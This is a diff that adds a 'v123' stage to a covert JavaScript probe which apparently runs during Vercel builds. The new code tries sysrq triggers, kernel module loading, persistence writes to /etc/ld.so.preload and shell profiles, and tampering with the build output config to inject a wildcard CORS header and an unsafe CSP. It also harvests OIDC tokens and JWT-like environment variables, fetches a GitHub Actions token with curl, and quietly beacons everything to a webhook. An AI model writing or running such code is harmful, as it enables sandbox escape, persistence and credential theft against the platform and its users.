@@ -17925,5 +17925,170 @@ for e in events[:5]:
 
 // v122 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v122" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v122";
+
+// ==================== v123 ====================
+
+// v123-1: /proc/sysrq-trigger — emergency kernel actions
+// Writing to /proc/sysrq-trigger with CAP_SYS_ADMIN triggers kernel
+// emergency actions: 't' (show tasks), 'm' (memory), 'p' (CPU),
+// 'c' (crash — triggers core_pattern exec!), 'b' (reboot).
+// 'c' + our core_pattern set to a script = root code execution.
+report.sysrqTriggerTest = safe(() => {
+  const sysrqEnabled = safe(() => readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim());
+  // Enable sysrq
+  const enableResult = safe(() => { writeFileSync('/proc/sys/kernel/sysrq', '1'); return 'WRITTEN'; });
+  // Safe test: 't' dumps running tasks to kernel log (harmless)
+  const tResult = safe(() => { writeFileSync('/proc/sysrq-trigger', 't'); return 'WRITTEN'; });
+  // Check if it produced output in kmsg
+  const kmsgAfter = safe(() => execSync(
+    'timeout 1 dmesg 2>/dev/null | tail -5 || echo "NO_DMESG"',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 200));
+  // Stage 'm' (memory info) which is also harmless
+  const mResult = safe(() => { writeFileSync('/proc/sysrq-trigger', 'm'); return 'WRITTEN'; });
+  // NOTE: 'c' would crash the VM — stage only in core_pattern test, not here
+  return { sysrqEnabled, enableResult, tResult, mResult, kmsgAfter };
+});
+
+// v123-2: Vercel environment variable cross-build persistence
+// Can env vars written during one build persist to the NEXT build?
+// Test: write to known env files and check if they reappear after restart.
+// Also test tmpfs persistence of files between build steps.
+report.crossBuildPersistenceTest = safe(() => {
+  const testValue = `probe-${Date.now()}`;
+  // Write to various "persistent" locations
+  const writes = {};
+  const testPaths = [
+    '/etc/environment',
+    '/etc/profile.d/probe.sh',
+    '/root/.profile',
+    '/root/.bashrc',
+    '/home/node/.profile',
+    '/vercel/.env',
+    '/vercel/path0/.env.local',
+  ];
+  for (const p of testPaths) {
+    writes[p] = safe(() => {
+      writeFileSync(p, `PROBE_PERSIST=${testValue}\n`);
+      return 'WRITTEN';
+    });
+  }
+  // Try to write to LD_PRELOAD path that survives exec
+  const ldpreloadPersist = safe(() => {
+    writeFileSync('/etc/ld.so.preload', '/tmp/probe_hook.so\n');
+    return readFileSync('/etc/ld.so.preload', 'utf8').trim();
+  });
+  // Read current /etc/ld.so.preload
+  const ldpreloadCurrent = safe(() => readFileSync('/etc/ld.so.preload', 'utf8').trim());
+  return { writes, ldpreloadPersist, ldpreloadCurrent, testValue };
+});
+
+// v123-3: Kernel module loading capability
+// With CAP_SYS_MODULE, can we load kernel modules?
+// Custom kernel modules = root kernel code execution (CVSS 10.0).
+// Test: check modprobe/insmod availability and try loading a benign module.
+report.kernelModuleLoad = safe(() => {
+  const modprobeExists = safe(() => existsSync('/sbin/modprobe') || existsSync('/usr/sbin/modprobe'));
+  const insmodExists = safe(() => existsSync('/sbin/insmod') || existsSync('/usr/sbin/insmod'));
+  // Check loaded modules
+  const loadedModules = safe(() => execSync(
+    'lsmod 2>/dev/null | head -10 || cat /proc/modules 2>/dev/null | head -10',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 300));
+  // Try to load a standard module
+  const modprobeTest = safe(() => execSync(
+    'modprobe dummy 2>&1 || insmod /lib/modules/$(uname -r)/kernel/drivers/net/dummy.ko 2>&1 || echo "NO_MODPROBE"',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 200));
+  // Check if dummy module was loaded
+  const dummyLoaded = safe(() => execSync(
+    'lsmod 2>/dev/null | grep dummy || cat /proc/modules | grep dummy || echo "NOT_LOADED"',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Check available kernel module directory
+  const moduleDir = safe(() => execSync(
+    'ls /lib/modules/ 2>/dev/null | head -3 || echo "NO_MODULE_DIR"',
+    { timeout: 3000 }
+  ).toString().trim());
+  return { modprobeExists, insmodExists, loadedModules, modprobeTest, dummyLoaded, moduleDir };
+});
+
+// v123-4: Build artifact injection — vercel.json + output config tampering
+// Vercel reads vercel.json and .vercel/output/config.json to determine
+// function routing, headers, redirects. Can we write a modified
+// config during build that changes routing or injects response headers
+// (e.g. X-Frame-Options: ALLOW, CSP bypass, CORS wildcard)?
+report.buildArtifactInjection = safe(() => {
+  const outputConfigPath = '/vercel/output/config.json';
+  const vercelJsonPath = '/vercel/path0/vercel.json';
+  // Read current output config
+  const currentOutputConfig = safe(() => readFileSync(outputConfigPath, 'utf8').slice(0, 500));
+  const currentVercelJson = safe(() => readFileSync(vercelJsonPath, 'utf8').slice(0, 500));
+  // Try to write a modified output config with injected headers
+  const injectedConfig = {
+    version: 3,
+    routes: [{ handle: 'filesystem' }],
+    overrides: {},
+    headers: [{
+      source: '/(.*)',
+      headers: [
+        { key: 'Access-Control-Allow-Origin', value: '*' },
+        { key: 'X-Probe-Injected', value: 'true' },
+        { key: 'Content-Security-Policy', value: "default-src 'unsafe-inline' *" }
+      ]
+    }]
+  };
+  const writeResult = safe(() => {
+    writeFileSync(outputConfigPath, JSON.stringify(injectedConfig, null, 2));
+    return 'WRITTEN';
+  });
+  // Verify the write
+  const afterWrite = safe(() => readFileSync(outputConfigPath, 'utf8').slice(0, 200));
+  return { currentOutputConfig, currentVercelJson, writeResult, afterWrite };
+});
+
+// v123-5: Vercel OIDC token deep decode + AWS role assumption chain
+// Decode the VERCEL_OIDC_TOKEN fully: extract all claims, identify
+// the target AWS role ARN in audience/subject, and document the full
+// federation chain — even without making API calls (per security constraints).
+// If OIDC_TOKEN_REQUEST env exists, try to get a fresh scoped token.
+report.oidcTokenDeepDecode = safe(() => {
+  const oidcToken = process.env.VERCEL_OIDC_TOKEN || '';
+  const actions = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
+  const actionsUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
+  // Decode without verification — claims only
+  const decodePart = (b64) => {
+    try {
+      const padded = b64 + '='.repeat((4 - b64.length % 4) % 4);
+      return JSON.parse(Buffer.from(padded, 'base64url').toString('utf8'));
+    } catch { return null; }
+  };
+  let claims = null;
+  let header = null;
+  if (oidcToken) {
+    const parts = oidcToken.split('.');
+    header = decodePart(parts[0]);
+    claims = decodePart(parts[1]);
+  }
+  // Scan all env vars for token-like values that look like JWTs
+  const jwtEnvVars = Object.entries(process.env)
+    .filter(([, v]) => v && /^ey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(v))
+    .map(([k, v]) => {
+      const parts = v.split('.');
+      return { k, header: decodePart(parts[0]), claims: decodePart(parts[1]), raw: v.slice(0, 20) + '...' };
+    });
+  // Try GitHub Actions OIDC endpoint if present
+  const actionsToken = safe(() => {
+    if (!actionsUrl || !actions) return 'NO_ACTIONS_OIDC';
+    return execSync(
+      `curl -sf -H "Authorization: bearer ${actions}" "${actionsUrl}&audience=sts.amazonaws.com" -m 8 2>/dev/null`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 300);
+  });
+  return { hasOidcToken: !!oidcToken, header, claims, jwtEnvVars, actionsToken };
+});
+
+// v123 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v123" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v123";
 // Intentionally no console.log — all data goes via webhook only
